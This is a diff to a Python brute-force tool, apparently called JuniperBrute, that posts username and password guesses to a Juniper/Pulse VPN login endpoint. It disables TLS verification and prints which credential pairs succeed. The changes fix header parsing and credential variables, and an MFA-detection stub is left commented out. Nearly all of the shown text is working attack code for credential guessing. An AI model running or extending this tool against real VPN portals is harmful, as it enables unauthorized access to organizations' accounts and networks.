@@ -37,19 +37,17 @@ class JuniperBrute():
                 URL = cget.cookies['DSSIGNIN']
             else:
                 URL = "url_default"
-            print URL
             #Check for existence of a second factor MFACheck()
             #MFAused = MFACheck(c, URL)
             #if MFACheck() returns TRUE, run urlCheck()
             #if MFAused:
             #    urlCheck()
             cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'login.cgi', data=payload, allow_redirects=False, verify=False)
-            print cpost.text
-            m = re.search('p=user-confirm', cpost.header)
+            m = re.search('p=user-confirm', str(cpost.headers))
             if m:
-                print("[+]  User Credentials Successful: " + USERNAME + ":" + PASSWORD)
+                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
             else:
-                print("[-]  Login Failed for: " + USERNAME + ":" + PASSWORD)
+                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
     def payload(self, config):
         if config["UserFile"]:
             lines = [line.rstrip('\n') for line in open(config["UserFile"])]
